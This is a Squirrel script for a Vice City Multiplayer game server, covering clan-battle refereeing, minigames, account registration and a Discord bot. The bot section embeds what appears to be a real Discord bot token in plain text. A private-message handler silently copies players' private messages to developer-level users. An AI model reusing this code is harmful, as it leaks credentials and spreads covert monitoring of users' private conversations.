		if( ( plr ) && ( CBattle.Staff.find( plr.ID ) != null || CBattle.CPOSubs.find( plr.ID ) != null || CBattle.CPTSubs.find( plr.ID ) != null || CBattle.Spectators.find( plr.ID ) != null ) )
		{
			plr.IsOnRadar = false;
			plr.Widescreen = true;
			if( CBattle.A == 1 )
			{
				plr.Pos = LocBFCameraPositions.RenderLoc;
				plr.SetCameraPos( LocBFCameraPositions.CamerasPos[0], LocBFCameraPositions.CameraLookPos );
			}
			else if( CBattle.A == 2 )
			{
				plr.Pos = LocArmyCameraPositions.RenderLoc;
				plr.SetCameraPos( LocArmyCameraPositions.CamerasPos[0], LocArmyCameraPositions.CameraLookPos );
			}
			else if( CBattle.A == 3 )
			{
				plr.Pos = LocDocksCameraPositions.RenderLoc;
				plr.SetCameraPos( LocDocksCameraPositions.CamerasPos[0], LocDocksCameraPositions.CameraLookPos );
			}
			else if( CBattle.A == 4 )
			{
				plr.Pos = LocPLCameraPositions.RenderLoc;
				plr.SetCameraPos( LocPLCameraPositions.CamerasPos[0], LocPLCameraPositions.CameraLookPos );
			}
			else if( CBattle.A == 5 )
			{
				plr.Pos = LocLegendCameraPositions.RenderLoc;
				plr.SetCameraPos( LocLegendCameraPositions.CamerasPos[0], LocLegendCameraPositions.CameraLookPos );
			}
		}
	}
}

function RefereeActivity( playerID )
{
	local player = FindPlayer( playerID ), success = false, plr;
	if( player )
	{
		for( local i = 0; i <= GetMaxPlayers(); i++ )
		{
		    local ref = FindPlayer( i );
			if( ( ref ) && ( status[ ref.ID ].Level == 4 ) )
			{
				if( CBattle.State == "ON" && CBattle.refereeSearch == true && CBattle.selectedReferees[ ref.ID ] == true || CBattle.State == "ON" && CBattle.refereeSearch == true && CBattle.V == 0 )
				{	
					plr = ref;
					if( CBattle.refereeSearch == true ) CBattle.refereeSearch = false;
					if( CBattle.State == "ON" ) CBattle.State = "OFF";
					CBattle.selectedReferees[ ref.ID ] = false;
					CBattle.TPlayers.clear();
					CBattle.Staff.clear();
					CBattle.ClanPlayers_One.clear();
					CBattle.ClanPlayers_Two.clear();
					CBattle.ClanTags.clear();
					CBattle.adminrequest = null;
					success = true;
				}
			}
		}
		if( success == true )
		{
			MessagePlayer( "[#FF0000]Error:[#FFFFFF] We're terribly sorry, but their is no referees/admins who'd like to deal with the match. Please try again later. Take care, sir/ma'm.", player );
			MessagePlayer( "[#FFDD33]Information:[#FFFFFF] The match invitation has expired.", plr );
	    }
	}
}

function ClanBattleSetup( r )
{
	local referee = FindPlayer( r );
	if( referee )
	{
		foreach( ID in CBattle.Staff )
		{
			local staffplr = FindPlayer( ID );
			if( staffplr )
			{
				staffplr.World = 2;
				staffplr.IsOnRadar = false;
				staffplr.Pos = staffloc;
			}
		}
		Message( "[#FFDD33]Information:[#FFFFFF] Dear staff team, a clan battle is currently active. If you'd like to assist the staff, use "+bas+"/joincb"+white+"." );
		CBattle.Referee_Process = true;
		CBArenaTimer <- NewTimer( "CBArenaProcess", 2000, 0, referee.ID );
	}
} 
	
function CBArenaProcess( r )
{
	local referee = FindPlayer( r );
	if( referee )
	{
		Announce( "Use the left and right arrow keys to switch to the next/previous arena, and the SPACEBAR to confirm the selection.", referee, 1 );
		referee.Widescreen = true;
		if( CBattle.A == 1 )
		{	
			referee.SetCameraPos( LocBFCameraPositions.CamerasPos[CBattle.I], LocBFCameraPositions.CameraLookPos );
			if( CBattle.I == 2 ) CBattle.I = 0;
			else CBattle.I++;
		}
		else if( CBattle.A == 2 )
		{
			referee.SetCameraPos( LocArmyCameraPositions.CamerasPos[CBattle.I], LocArmyCameraPositions.CameraLookPos );
			if( CBattle.I == 2 ) CBattle.I = 0;
			else CBattle.I++;
		}
		else if( CBattle.A == 3 )
		{
			referee.SetCameraPos( LocDocksCameraPositions.CamerasPos[CBattle.I], LocDocksCameraPositions.CameraLookPos );
			if( CBattle.I == 2 ) CBattle.I = 0;
			else CBattle.I++;
		}
		else if( CBattle.A == 4 )
		{
			referee.SetCameraPos( LocPLCameraPositions.CamerasPos[CBattle.I], LocPLCameraPositions.CameraLookPos );
			if( CBattle.I == 2 ) CBattle.I = 0;
			else CBattle.I++;
		}
		else if( CBattle.A == 5 )
		{
			referee.SetCameraPos( LocLegendCameraPositions.CamerasPos[CBattle.I], LocLegendCameraPositions.CameraLookPos );
			if( CBattle.I == 2 ) CBattle.I = 0;
			else CBattle.I++;
		}
	}
}

function CBRStartCall( stage ) { CBattle.CBRStart( stage ); }

function CBRStartCallTimer()
{
	if( CBattle.Round > 1 )
	{
		NewTimer( "CBRStartCall", 6000, 1, 1 );
		NewTimer( "CBRStartCall", 16000, 1, 2 );
		NewTimer( "Ann", 17000, 1, "10" );
		NewTimer( "Ann", 18000, 1, "9" );
		NewTimer( "Ann", 19000, 1, "8" );
		NewTimer( "Ann", 20000, 1, "7" );
		NewTimer( "Ann", 21000, 1, "6" );
		NewTimer( "Ann", 22000, 1, "5" );
		NewTimer( "Ann", 23000, 1, "4" );
		NewTimer( "Ann", 24000, 1, "3" );
		NewTimer( "Ann", 25000, 1, "2" );
		NewTimer( "Ann", 26000, 1, "1" );
		NewTimer( "Ann", 27000, 1, "11" );
		NewTimer( "CBRStartCall", 27000, 1, 3 );
	}
	else
	{
		CBRStartCall( 1 );
		NewTimer( "CBRStartCall", 10000, 1, 2 );
		NewTimer( "Ann", 11000, 1, "10" );
		NewTimer( "Ann", 12000, 1, "9" );
		NewTimer( "Ann", 13000, 1, "8" );
		NewTimer( "Ann", 14000, 1, "7" );
		NewTimer( "Ann", 15000, 1, "6" );
		NewTimer( "Ann", 16000, 1, "5" );
		NewTimer( "Ann", 17000, 1, "4" );
		NewTimer( "Ann", 18000, 1, "3" );
		NewTimer( "Ann", 19000, 1, "2" );
		NewTimer( "Ann", 20000, 1, "1" );
		NewTimer( "Ann", 21000, 1, "11" );
		NewTimer( "CBRStartCall", 21000, 1, 3 );
	}
}

function CBPause( active, timesup = 0 )
{
	if( !active )
	{
		if( timesup == 1 )
		{
			local found = false;
			if( CBattle.Staff.len() == 0 ) CBattle.Timer2 = NewTimer( "CBPause", 120000, 1, 0, 2 );
			else
			{
				for( local i = 0; i <= GetMaxPlayers(); i++ )
				{
					local plr = FindPlayer( i );
					if( plr )
					{	
						MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Time's up! Unfortunately, hence the admin is inactive, a referee will be given temporary admin access to resume the match.", plr );
						if( CBattle.Staff.find( plr.ID ) != null && status[ plr.ID ].Level == 4 && !found )
						{
							status[ plr.ID ].Level = 5;
							CBattle.tempadmin = plr.Name;
							found = true;
						}
					}
				}
				foreach( ID in CBattle.TPlayers )
				{
					local plr = FindPlayer( ID );
					if( plr )
					{
						if( CBattle.ClanPlayers_One.find( plr.ID ) != null ) plr.Pos = FirstCPosLocBF[ CBattle.FC_Alive ];
						else if( CBattle.ClanPlayers_Two.find( plr.ID ) != null ) plr.Pos = SecondCPosLocBF[ CBattle.SC_Alive ];
					}
				}
				SetSpectators();
				CBattle.State = "STARTED";
				CBattle.CBRStart( 3 );
			}	
		}
		else if( timesup == 2 )
		{
			for( local i = 0; i <= GetMaxPlayers(); i++ )
			{
				local plr = FindPlayer( i );
				if( ( plr ) && ( plr.World == 2 ) )
				{
					MessagePlayer( "[#FFDD33]Information:[#FFFFFF] We're terribly sorry for the incovinience but since there's no staff members in the clan battle, our options is to declare a resignation of the clan battle.", plr );
					plr.IsFrozen = false;
					plr.World = 1;
					plr.Pos = CBattle.iData[ plr.ID ];	
				}
			}
			CBattle.State = "OFF";
			CBattle.ClanPlayers_One.clear();
			CBattle.ClanPlayers_Two.clear();
			CBattle.CPOSubs.clear();
			CBattle.CPTSubs.clear();
			CBattle.Staff.clear();
			CBattle.Spectators.clear();
			CBattle.TPlayers.clear();
			CBattle.adminrequest = null;
			CBattle.A = 1;
			CBattle.I = 0;
			CBattle.FC_Alive = 0;
			CBattle.SC_Alive = 0;
			CBattle.SC_Score = 0;
			CBattle.FC_Score = 0;
			CBattle.Round = 1;
			Message( "[#FFDD33]Information:[#FFFFFF] The clan battle between "+ CBattle.ClanTags[0] +" & "+ CBattle.ClanTags[1] +" has been officially canceled due to lack of staff members." );
			CBattle.ClanTags.clear();
		}
		else
		{
			CBattle.State = "PENDING";
			foreach( ID in CBattle.TPlayers )
			{
				local plr = FindPlayer( ID );
				if( plr )
				{
					plr.IsFrozen = true;
					plr.Pos = clansloc;
					plr.CanAttack = false;
					if( CBattle.ClanPlayers_One.find( plr.ID ) == null || CBattle.ClanPlayers_Two.find( plr.ID ) == null ) plr.RestoreCamera();
				}
			}
			Message( "[#FFDD33]Information:[#FFFFFF] The clan battle has been paused due to an inactive staff member(s) to continue the match. If the staff member fails to return by 3 minutes, any referee online in the match will be given the admin level temporarily." );
			CBattle.Timer1 = NewTimer( "CBPause", 180000, 1, 0, 1 );
		}
	}
	else
	{
		if( CBattle.Timer1 ) CBattle.Timer1 = null;
		if( CBattle.Timer2 ) CBattle.Timer2 = null;
		Message( "[#FFDD33]Information:[#FFFFFF] The clan battle has been resumed as the administrator(s) have returned in-game." );
		foreach( ID in CBattle.TPlayers )
		{
			local plr = FindPlayer( ID );
			if( plr )
			{
				if( CBattle.ClanPlayers_One.find( plr.ID ) != null ) plr.Pos = FirstCPosLocBF[ CBattle.FC_Alive ];
				else if( CBattle.ClanPlayers_Two.find( plr.ID ) != null ) plr.Pos = SecondCPosLocBF[ CBattle.SC_Alive ];
			}
		}
		SetSpectators();
		CBattle.State = "STARTED";
		CBattle.CBRStart( 3 );
	}
}

function Ann ( number )
{
  for( local i=0; i <= GetMaxPlayers(); i++ )
  {
    local plr = FindPlayer( i );
    if( ( plr ) && ( CBattle.TPlayers.find( plr.ID ) != null ) )
    {
        switch( number.tointeger() )
        {
          case 1:
            Announce( "1", plr, 6 );
            break;
          case 2:
            Announce( "2", plr, 6 );
            break;
          case 3:
            Announce( "3", plr, 6 );
            break;
          case 4:
            Announce( "4", plr, 6 );
            break;
          case 5:
            Announce( "5", plr, 6 );
            break;
          case 6:
            Announce( "6", plr, 6 );
            break;
          case 7:
            Announce( "7", plr, 6 );
            break;
          case 8:
            Announce( "8", plr, 6 );
            break;
          case 9:
            Announce( "9", plr, 6 );
            break;
          case 10:
            Announce( "10", plr, 6 );
            break;
		  case 11:
			Announce( "GO!", plr, 6 );
			break;
        }
    }
  }
}



function RegisterPlayer(p, arguments)
{
	local player = FindPlayer(p);
	if(player)
	{
		status[player.ID].Level = 1;
		status[player.ID].Registered = true;
		status[player.ID].LoggedIn = true;
		local now = date();
		QuerySQL(DB, "INSERT INTO Accounts ( Name, LowerName, Password, Level, TimeRegistered, UID, IP, AutoLogin, Banned, Kills, Headshots, Deaths ) VALUES ('"+escapeSQLString(player.Name)+"', '"+escapeSQLString(player.Name.tolower())+"', '"+SHA256(arguments)+"', '1', '" + now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec + "', '"+player.UID+"', '"+player.IP+"', 'true', 'No', '0', '0', '0') ");
	}

}























// ------------------ MINIGAMES ------------------------ //


_GG <-{
 Alive = 0,
 Players = [],
 iData = array( GetMaxPlayers() ),
 state = "OFF",
 teamid = 5
 
 
 function JoinGG(player)
 {
	if( state == "OFF")
	{
		state = "ON"
	}
	Players.push( player.ID );
	Alive++;
	SendDataToClient(player, 1, "Gun game")
	_GG.setteam(player.ID);
	player.IsFrozen = true;
	player.World = 9001;
	iData[ player.ID ] = player.Pos;
	local GL = GGlocs[ rand() % GGlocs.len() ];
	player.Pos = Vector( GetTok(GL, " ", 1).tofloat(), GetTok(GL, " ", 2).tofloat(), GetTok(GL, " ", 3).tofloat());
	for (local i = 0 ; i <200 ; i++)
	{
		player.RemoveWeapon(i);
	}
	player.GiveWeapon(20, 9999);
	MessagePlayer( "[#FFDD33]Information:[#FFFFFF] You joined Minigame: Gun Game. Player Count: "+Alive+".", player );
	Message( "[#FFDD33]Minigame:[#FFFFFF] Player: "+pcol(player.ID)+player.Name+white+" has joined the Minigame Gungame. Use /"+bas+"gungame "+white+"to join." );
 }
 
 function StartGG(player)
 {
  
	if( Alive >= 2 )
	{
		state = "STARTED";
		local iPlayer;
		foreach( ID in Players )
		{
			iPlayer = FindPlayer( ID );
			if( iPlayer )
			{
				iPlayer.IsFrozen = false;
				iPlayer.CanAttack = true;
				MessagePlayer("[#FFDD33]Minigame:[#FFFFFF] Gun Game is started.", iPlayer);
			}
		}
	}
	else
	{
		MessagePlayer( "[#FF0000]Error:[#FFFFFF] There must be atleast 2 player to start the minigame.", player );
	}
}
 
function PartGG( player )
 {
  Alive--;
  Players.remove( player.ID );
  SendDataToClient(player, 3, "");
  player.World = 1;
  Message( "[#FFDD33]Minigame:[#FFFFFF] Player: "+pcol(player.ID) + player.Name +white+ " has left the minigame: Gun Game." );
  if(status[player.ID].spawnwep != null) setspawnwep(player.ID, status[player.ID].spawnwep);
	player.IsFrozen = false;
	player.CanAttack = false;
	player.Pos = Vector( -657.091, 762.422, 11.5998 );
  if(state == "STARTED")
  {
  if( Alive <= 1 ) 
  { 
   foreach( ID in Players ) { 
   local iPlayer = FindPlayer( ID ); 
   if( iPlayer ) _GG.Winner( iPlayer ); 
   } 
  }
 }
} 
 
 function Winner( player )
 {
	state = "OFF";
	foreach(ID in Players)
	{
		local iPlayer = FindPlayer(ID);
		if(iPlayer)
		{
			iPlayer.IsFrozen = false;
			iPlayer.CanAttack = false;
			SendDataToClient(iPlayer, 3, "");
			iPlayer.World = 1;
			if(iPlayer.IsSpawned) iPlayer.Pos = Vector( -657.091, 762.422, 11.5998 );
			status[iPlayer.ID].miniscore = 0;
			status[iPlayer.ID].minigame = null;
		}
	} 
	Players.clear();
	Message( "[#FFDD33]Minigame:[#FFFFFF] "+pcol(player.ID)+player.Name+white + " has won the minigame: Gun Game" );

 }

 function updateGG(p)
 {
 		local iPlayer;
		foreach( ID in Players )
		{
			iPlayer = FindPlayer( ID );
			if( iPlayer )
			{
				
				SendDataToClient(iPlayer, 2, p);
			}
		}
	}

function setteam(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		player.Team = player.ID + 100;
		
	}
}
}

function GGchangepos(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		local GL = GGlocs[ rand() % GGlocs.len() ];
		player.Pos = Vector( GetTok(GL, " ", 1).tofloat(), GetTok(GL, " ", 2).tofloat(), GetTok(GL, " ", 3).tofloat());
		player.IsFrozen = false;
	}

}




function miniroundspawn(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		if(!player.IsSpawned) player.Spawn();
	}
}
function miniroundkill(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		if(status[player.ID].minigame == "GG")
		{
			for (local i = 0 ; i <33 ; i++)
			{
				player.RemoveWeapon(i);
			}
			player.SetWeapon(0,0);
			status[player.ID].miniscore += 1;
			local score1 = player.Name + " : " + status[player.ID].miniscore.tointeger();
			_GG.updateGG(score1);
			switch (status[player.ID].miniscore.tointeger())
			{
				case 0: 
				{
					player.SetWeapon(20, 9999);
					break;
				}
				case 1: 
				{
					player.SetWeapon(19, 9999);
					break;
				}
				case 2: 
				{
					player.SetWeapon(21, 9999);
					break;
				}
				case 3: 
				{
					player.SetWeapon(32, 9999);
					break;
				}
				case 4: 
				{
					player.SetWeapon(27, 9999);
					break;
				}
				case 5: 
				{
					player.SetWeapon(30, 9999);
					break;
				}
				case 6: 
				{
					player.SetWeapon(24, 9999);
					break;
				}
				case 7: 
				{
					player.SetWeapon(11, 9999);
					break;
				}
				case 8: 
				{
					player.SetWeapon(24, 9999);
					break;
				}
				case 9: 
				{
					player.SetWeapon(18, 9999);
					break;
				}
				case 10: 
				{
					player.SetWeapon(29, 9999);
					break;
				}
				case 11: 
				{
					player.SetWeapon(25, 9999);
					break;
				}
				case 12: 
				{
					player.SetWeapon(23, 9999);
					break;
				}
				case 13: 
				{
					player.SetWeapon(12, 9999);
					break;
				}
				case 14: 
				{
					player.SetWeapon(17, 9999);
					break;
				}
				case 15: 
				{
					player.SetWeapon(10, 9999);
					break;
				}
				case 16:
				{
					_GG.Winner(player);
				}
			}
		}
	}

}

function miniround(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		if(status[player.ID].minigame == "GG")
		{
			_GG.setteam(player.ID);
			for (local i = 0 ; i <33 ; i++)
			{
				player.RemoveWeapon(i);
			}
			player.CanAttack = true;
			local score = status[player.ID].miniscore;
			switch (score)
			{
				case 0: 
				{
					player.SetWeapon(20, 9999);
					break;
				}
				case 1: 
				{
					player.SetWeapon(19, 9999);
					break;
				}
				case 2: 
				{
				player.SetWeapon(21, 9999);
					break;
				}
				case 3: 
				{
					player.SetWeapon(32, 9999);
					break;
				}
				case 4: 
				{
					player.SetWeapon(27, 9999);
					break;
				}
				case 5: 
				{
					player.SetWeapon(30, 9999);
					break;
				}
				case 6: 
				{
				player.SetWeapon(24, 9999);
					break;
				}
				case 7: 
				{
				player.SetWeapon(11, 9999);
					break;
				}
				case 8: 
				{
				player.SetWeapon(24, 9999);
					break;
				}
				case 9: 
				{
				player.SetWeapon(18, 9999);
					break;
				}
				case 10: 
				{
					player.SetWeapon(29, 9999);
					break;
				}
				case 11: 
				{
				player.SetWeapon(25, 9999);
					break;
				}
				case 12: 
				{
				player.SetWeapon(23, 9999);
					break;
				}
				case 13: 
				{
					player.SetWeapon(12, 9999);
					break;
				}
				case 14: 
				{
				player.SetWeapon(17, 9999);
					break;
				}
				case 15: 
				{
				player.SetWeapon(10, 9999);
					break;
				}
				case 16:
				{
					_GG.Winner(player);
				}
			}
			if(status[player.ID].minigame == "FR")
			{
				_FR.setteam(player.ID);
				player.CanAttack = true;
				player.IsFrozen = false;
				if(status[player.ID].miniscore == 16)
				{
					_FR.Winner(player);
				}
			}
		}
	}
}



_FR <- {

 Alive = 0,
 Players = [],
 iData = array( GetMaxPlayers() ),
 state = "OFF",
 teamid = 5
 
 
 function JoinFR(player)
 {
	if( state == "OFF")
	{
		state = "ON"
	}
	Players.push( player.ID );
	Alive++;
	SendDataToClient(player, 1, "Frenzy");
	setteam(player.ID);
	player.IsFrozen = true;
	player.World = 9002;
	_FR.setteam(player.ID);
	iData[ player.ID ] = player.Pos;
	local GL = GGlocs[ rand() % GGlocs.len() ];
	player.Pos = Vector( GetTok(GL, " ", 1).tofloat(), GetTok(GL, " ", 2).tofloat(), GetTok(GL, " ", 3).tofloat());
	MessagePlayer( "[#FFDD33]Information:[#FFFFFF] You joined Minigame: Frenzy. Player Count: "+Alive+".", player );
	Message( "[#FFDD33]Minigame:[#FFFFFF] Player: "+pcol(player.ID)+player.Name+white+" has joined the Minigame Frenzy. Use /"+bas+"frenzy "+white+"to join." );
 }
 
 function StartFR(player)
 {
  
	if( Alive >= 2 )
	{
		state = "STARTED";
		local iPlayer;
		foreach( ID in Players )
		{
			iPlayer = FindPlayer( ID );
			if( iPlayer )
			{
				iPlayer.IsFrozen = false;
				iPlayer.CanAttack = true;
				local target = Players[ rand() % Players.len() ];
				local plr = FindPlayer(target.tointeger());
				if(plr != player)
				{
					status[iPlayer.ID].minitarget = target;
					SendDataToClient(iPlayer, 4, plr.Name);
					MessagePlayer("[#FFDD33]Minigame:[#FFFFFF] Frenzy is started.", iPlayer);
				}
				else _FR.restartFR(iPlayer);
				
			}
		}
	}
	else
	{
		MessagePlayer( "[#FF0000]Error:[#FFFFFF] There must be atleast 2 player to start the minigame.", player );
	}
}
 function restartFR(iPlayer)
 {
	iPlayer.IsFrozen = false;
	iPlayer.CanAttack = true;
	local target = Players[ rand() % Players.len() ];
	local plr = FindPlayer(target.tointeger());
	if(plr != iPlayer)
	{
		status[iPlayer.ID].minitarget = target;
		SendDataToClient(iPlayer, 4, plr.Name);
		MessagePlayer("[#FFDD33]Minigame:[#FFFFFF] Frenzy is started.", iPlayer);
	}
	else _GG. restartFR(iPlayer);
 }
function PartFR( player )
 {
	Alive--;
	Players.remove( player.ID );
	SendDataToClient(player, 3, "");
	SendDataToClient(player, 5, "");
	player.World = 1;
	player.Pos = Vector( -657.091, 762.422, 11.5998 );
	Message( "[#FFDD33]Minigame:[#FFFFFF] Player: "+pcol(player.ID) + player.Name +white+ " has left the minigame: Frenzy." );
	player.IsFrozen = false;
	if( Alive <= 1 ) 
	{ 
		foreach( ID in Players )
		{ 
			local iPlayer = FindPlayer( ID ); 
			if( iPlayer ) _FR.Winner( iPlayer ); 
		}
	}   
	else
	{
		foreach(ID in Players)
		{
			local plr = FindPlayer(ID);
			if(plr && status[plr.ID].minitarget == player.ID)
			{
				_FR.restartFR(plr);
			}
		}
		player.CanAttack = false;
	}
}
 
 
 function Winner( player )
 {
	state = "OFF";
	foreach(ID in Players)
	{
		local iPlayer = FindPlayer(ID);
		if(iPlayer)
		{
			iPlayer.IsFrozen = false;
			iPlayer.CanAttack = false;
			SendDataToClient(iPlayer, 3, "");
			SendDataToClient(iPlayer, 5, "");
			iPlayer.World = 1;
			if(iPlayer.IsSpawned) iPlayer.Pos = Vector( -657.091, 762.422, 11.5998 );
			status[iPlayer.ID].miniscore = 0;
			status[iPlayer.ID].minigame = null;
		}
	} 
	Players.clear();
	Message( "[#FFDD33]Minigame:[#FFFFFF] "+pcol(player.ID)+player.Name+white + " has won the minigame: Frenzy" );

 }

 function updateFR(p)
 {
 		local iPlayer;
		foreach( ID in Players )
		{
			iPlayer = FindPlayer( ID );
			if( iPlayer )
			{
				
				SendDataToClient(iPlayer, 2, p);
			}
		}
	}

	
function killFR(k, p)
{
	local killer = FindPlayer(k), player = FindPlayer(p);
	if( killer && player)
	{
		if(status[killer.ID].minitarget == p)
		{
			SendDataToClient(killer, 7, "30");
			local target = Players[ rand() % Players.len() ];
			local plr = FindPlayer(target.tointeger());
			status[killer.ID].miniscore += 1;
			local score = killer.Name + " : " + status[killer.ID].miniscore.tointeger();
			_FR.updateFR(score);
			if(plr != player)
			{
				status[plr.ID].minitarget = target;
				SendDataToClient(player, 4, plr.Name);
			}
			else _FR.restartFR(player);
		}
		else SendDataToClient(killer, 7, "10");
	}
}

function deathFR(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		SendDataToClient(player, 7, "-10");
	}
}
	
function setteam(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		player.Team = player.ID +100;

	}
}
}

// ------------------ END MINIGAMES









// ---------------- Discord Bot ----------------
myDiscord <- null;
sessions <- {};
channel <- "574932214203285504";
achannel <- "574932591187197952";
uDiscordToggle <- true;
class CDiscord
{
	session 		= null;
	connID			= null;
	BotToken		= null;
	Prefix			= null;
	function constructor()
	{
		session 		= ::SqDiscord.CSession();
		connID			= session.ConnID;
		Prefix			= "!";
		BotToken		= "NTc0OTI2OTYyNjcwMzA1Mjgx.XNAkmg._-y1FmEVz0IBajrqOXrfNp4HKck";
		::sessions.rawset(connID, this);
	}
	
	function Connect(token)
	{
		session.Connect(token);
	}
	
	function sendMessage(chanel, message)
	{
		session.Message(chanel, message);
	}


	function sendEmbed(channelID, embed)
	{
		session.MessageEmbed(channelID, embed);
	}
	
	function GetRoleName(roleID)
	{
//		return session.GetRoleName("333951896182325249", roleID);
	}

	function onReady()
	{
		local embed = ::SqDiscord.Embed.Embed();
		embed.SetTitle("VCT Discord Bot Connected!");
		embed.SetDescription("Integrated with the server");
		embed.SetColor(45658);
		sendEmbed(channel, embed);
		embed.SetColor(22780);
		embed.SetDescription("Admin Channel only");
		sendEmbed(achannel, embed);
		SetActivity("VC:MP");
		print("Discord Bot Setup Complete.");
	}
	
	function onMessage(channelID, author, authorNick, authorID, roles, message)
	{
	}
	
	function SetActivity(activity)
	{
		session.SetActivity(activity);
	}
}

function onDiscord_Ready(session)
{
	if(sessions.rawin(session.ConnID))
	{
		local session_s = sessions.rawget(session.ConnID);
		session_s.onReady();
	}
}

function onDiscord_Message(session, channelID, author, authorNick, authorID, roles, message)
{
	if(sessions.rawin(session.ConnID))
	{
		local session_s = sessions.rawget(session.ConnID);
		session_s.onMessage(channelID, author, authorNick, authorID, roles, message);
		if(channelID == channel && authorID != "574926962670305281")
		{
			if(message.slice(0,1) == myDiscord.Prefix) 
			{
				if(message.find("<:") != null || ucheckchars(message) == true) SendDiscord(channel, "**"+author+"**, emojies/special characters are not allowed.");
				else
				{
					RunDiscordCommand(author, authorID, message);
				}
			}
		}
//		if(channelID == admin_channel && authorID != "574926962670305281") RunDiscordAdminCommand(author, authorID, message);
	}
}

function SendDiscord(ch, message)
{
	if(uDiscordToggle == true)
	{
		if(message == "" || message.slice(0,1) != '\\' || message.slice(0,1) != '/')
		{
			myDiscord.sendMessage(ch, message);
		}
	}
}



function SendDiscord2(ch, m1, m2)
{
	if(uDiscordToggle == true)
	{
		if(m1 == "" || m1.slice(0,1) != '\\' || m1.slice(0,1) != '/' || m2 == "" || m2.slice(0,1) != '\\' || m2.slice(0,1) != '/')
		{
			local embed = ::SqDiscord.Embed.Embed();
			embed.SetTitle(m1);
			embed.SetDescription(m2);
			embed.SetColor(4359924);
			myDiscord.sendEmbed(ch, embed);
		}
	}
	
}




class DiscordPlayer
{
	Name = null;
	ID = 1000;
	Vehicle = null;
	Team = 1000;
	UID = null;
	IP = null;
	
}


function RunDiscordCommand(author, authorID, message)
{
	local player = DiscordPlayer();
	player.Name = author+"(Discord)";
	player.UID = authorID;
	player.IP = 0.0.0.0;
	player.ID = 110;
	local command, cmd, text, arguments;
	cmd = message.slice(1, (GetTok2(message, " ", 1)).len());
	arguments = GetTok2(message, " ", 2, NumTok(message, " "));
	text = arguments;
	
	if(message.len() > 100) SendDiscord(channel, "**Error:** "+author+", the limit of message is 100 characters.");
	else
	{
	
	if(cmd == "say")
	{
		ClientMessageToAll("[#C8C8C8][Discord][#FFFFFF] [#00B2B2]"+author+"[#FFFFFF]: "+arguments, 0,0,0);
	}

	else if(cmd == "players" || cmd == "player")
	{
		SendDiscord2("Total Players online", GetPlayers()+"/"+GetMaxPlayers());
	}
	else if(cmd == "help" || cmd == "commands" || cmd == "cmds")
	{
		SendDiscord2("Available commands", "!say, !players, !admins");
	}
	
	else if(cmd == "admins" || cmd == "admin")
	{
		local plr, b, m;
		b=0;
		m = 0;
		for( local i = 0; i <= GetMaxPlayers(); i++ )
		{
			plr = FindPlayer( i );
			if (plr && LevelPlayer(plr) >= 3)
			{
				b=b+1;
				if( m == 0)
				{
					m = plr.Name;
				}
				else
				{
					m = m + ", "+ plr.Name;
				}
			}
		}
		if (b)
		{
			SendDiscord2("List of Admins in server, requested by: "+player.Name, m);
		}
		if(!b) SendDiscord2("List of Admins in server, requested by: "+player.Name, "None" );
	}
	
	else return;
	
	}

}



function ucheckchars(string)
{
local chars = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "V", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k.", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1",
"2", "3", "4", "5", "6", "7", "8", "9", " ", "!", " ", "#", "$", "%", "&", " ", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?",
"@", "^", "_", "`", "{", "|", "}", "~", "\\", "[", "]"]; 

local b = false, start = time();
for(local i = 1; i<= string.len() - 1; i++)
{
	if(chars.find(string.slice(i - 1, i)) == null)
	{ b = true; }
	i++;
}
	if(b) return true;
	else return false;

}  



// --------------------End Discord Bot --------------------------










function onPlayerPM( player, playerTo, message )
{
	for(local i = 0; i <= GetMaxPlayers(); i++)
	{
		local plr = FindPlayer(i);
		if(plr && status[plr.ID].Level == 6)
		MessagePlayer("[#FF00FF]Priv Msg "+pcol(player.ID)+player.Name+white+" to "+pcol(playerTo.ID)+playerTo.Name+white+": "+message, plr)
	}
	return 1;
}







function SendDataToClient(player, integer, string)
{
 Stream.StartWrite();
 Stream.WriteInt(integer);
 if (string != null) Stream.WriteString(string);
 Stream.SendStream(player);
 MessagePlayer("data sending", player);
}


function onClientScriptData(player)
{
	local int = Stream.ReadInt(),
	string = Stream.ReadString();

	switch (int.tointeger())
	{
		case 1: 
			MessagePlayer("[#FFDD33]Minigame:"+white+" You failed to kill the target within time.",player);
			_FR.PartFR(player);
		break;
		case 2:
			RegisterPlayer(player.ID, string);
		break;
		case 3:
			if(status[player.ID].pass == SHA256(string)) 
			{
				SendDataToClient(player, 12, "");
				status[player.ID].LoggedIn = true;
			}
			else SendDataToClient(player, 11, "");
		break;
		case 4:
			status[player.ID].welcomescreen = true;
		break;
	}

}







function GetTok(string, separator, n, ...)
{
local m = vargv.len() > 0 ? vargv[0] : n,
tokenized = split(string, separator),
text = "";
if (n > tokenized.len() || n < 1) return null;
for (; n <= m; n++)
{
text += text == "" ? tokenized[n-1] : separator + tokenized[n-1];
}
return text;
}

function NumTok(string, separator)
{
local tokenized = split(string, separator);
return tokenized.len();
}

function getrank(id)
{
	switch(id)
	{
		case 1: return "Member";
		case 2: return "Co-Leader";
		case 3: return "Leader";
		case 4: return "Founder";
	}
}

function checklvl( lvl )
{
    switch( lvl.tointeger() )
    {
      case 0: return "Unregistered";
      case 1: return "Member";
      case 2: return "Tournament Participant Group 1";
      case 3: return "Tournament Participant Group 2";
      case 4: return "Referee";
      case 5: return "Administrator";
      case 6: return "Server Developer";
    }
}
function pcol(p)
{
	local player = FindPlayer(p);
	if(!player) return;
	else
	{
		if(player.Team > 5) return "[#F9FF87]";
		else
		{
			switch( player.Team )
			{
				case 1: return "[#F9FF87]";
				case 2: return "[#6495ED]";
				case 3: return "[#C80000]";
				case 4: return "[#178722]";
				case 5: return "[#D3D3D3]";
				default: return "[#F9FF87]";
			}
		}
	}
}
function GetTeamRGB( teamid )
{
  switch ( teamid )
  {
    case 1: return RGB(249,255,135);
